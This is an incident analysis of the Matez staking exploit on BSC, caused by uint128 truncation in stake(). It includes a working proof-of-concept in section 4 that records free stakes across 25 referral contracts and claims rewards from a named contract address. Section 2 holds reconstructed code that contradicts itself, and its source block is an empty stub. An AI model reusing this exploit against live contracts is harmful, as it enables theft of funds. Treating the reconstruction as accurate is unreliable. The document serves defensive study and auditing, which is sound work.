# Matez — Integer Truncation Staking Reward Free-Claim Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-11-19 |
| **Protocol** | Matez Staking |
| **Chain** | BSC |
| **Loss** | ~80,000 USD |
| **Attacker** | [0xd4f04374](https://bscscan.com/address/0xd4f04374385341da7333b82b230cd223143c4d62) |
| **Attack Tx** | [0x840b0dc6](https://bscscan.com/tx/0x840b0dc64dbb91e8aba524f67189f639a0bc94ee9256c57d79083bb3fd46ec91) |
| **Vulnerable Contract** | [0x326FB70e](https://bscscan.com/address/0x326FB70eF9e70f8f4c38CFbfaF39F960A5C252fa) |
| **Root Cause** | Integer truncation in `stake()` — inputs ≥ 2^128 truncate to 0 on transfer, recording a large stake with no tokens sent, allowing free reward claims |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-11/Matez_exp.sol) |

---
## 1. Vulnerability Overview

The Matez staking contract contained the same integer truncation vulnerability as MFT. Passing `2^128` to the `stake()` function causes truncation to `uint128`, resulting in a value of 0 — recording a large stake position with no actual token transfer. The attacker exploited this by deploying 25 referral contracts and claiming a large amount of MATEZ rewards for free. This is the same pattern as the MFT incident, occurring in the same month from a similar codebase.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Matez Staking: same integer truncation vulnerability as MFT
contract MatezStaking {
    mapping(address => uint128) public stakedAmount;

    function stake(uint256 amnt) external {
        // ❌ uint128 truncation: 2^128 input → 0
        uint128 truncated = uint128(amnt);
        stakedAmount[msg.sender] += truncated;  // adds 0

        // ❌ actual transfer is also 0
        IERC20(MATEZ_TOKEN).transferFrom(msg.sender, address(this), truncated);
        // → 0 MATEZ actually transferred
        // → but reward calculation elsewhere uses the original amnt
    }
}

// ✅ Fix:
// require(amnt > 0 && amnt <= type(uint128).max, "invalid amount");
// or use uint256
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: Matez_decompiled.sol
contract Matez {
    function stake(uint256 p0) external {}  // ❌ vulnerable
```

## 3. Attack Flow

```
Attacker (0xd4f04374)
  │
  ├─[1]─▶ Call register(sponsor)
  │
  ├─[2]─▶ Call stake(2^128)
  │         └─ ❌ uint128 truncation → 0 MATEZ actually transferred
  │             but large stake position recorded in contract
  │
  ├─[3]─▶ Deploy 25 AttackContracts (for i in range 25)
  │         each calls register(attacker) + stake(2^128)
  │         → acquires 25 referrals
  │
  ├─[4]─▶ Call claim(3, 1, 0)
  │         └─ large stake + 25 referral conditions satisfied
  │             large MATEZ reward claimed for free
  │
  └─[5]─▶ Sell MATEZ → ~80,000 USD extracted
```

## 4. PoC Code

```solidity
function testExploit() public balanceLog {
    uint256 amount = 340282366920938463463374607431768211456;  // 2^128
    IMatez matez = IMatez(MATEZ_STAKING_PROG);

    address sponsor = 0x80d93e9451A6830e9A531f15CCa42Cb0357D511f;
    matez.register(sponsor);

    // ❌ stake 2^128: actual transfer is 0
    matez.stake(amount);

    // Deploy 25 referral contracts (each stakes large amount at zero cost)
    for (uint256 i = 0; i < 25; i++) {
        new AttackContract(address(this), amount);
    }

    // Claim rewards for free
    IMatez(MATEZ_STAKING_PROG).claim(uint40(3), uint40(1), 0);
}

contract AttackContract {
    constructor(address sponsor, uint256 amount) {
        IMatez matez = IMatez(MATEZ_STAKING_PROG);
        matez.register(sponsor);
        matez.stake(amount);  // large stake recorded at zero cost
    }
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Integer Truncation / Business Logic Vulnerability |
| **Attack Vector** | uint128 truncation overflow + referral reward claim |
| **CWE** | CWE-190: Integer Overflow |
| **DASP** | Business Logic Vulnerability |
| **Severity** | High |

## 6. Remediation Recommendations

1. **Input range validation**: Add `require(amnt <= type(uint128).max)`
2. **Post-transfer balance check**: Verify that the recorded stake amount matches the actual transferred amount
3. **Stricter referral requirements**: Require a minimum genuine stake amount
4. **Pattern sharing**: Same vulnerability as MFT — issue an industry alert to immediately audit similar codebases

## 7. Lessons Learned

- Nearly identical code patterns from the MFT incident (same month) reappeared in Matez.
- Integer truncation occurs implicitly in Solidity, making explicit range validation mandatory.
- The recurrence of the same vulnerability across multiple protocols reflects a systemic lack of audit culture across the industry.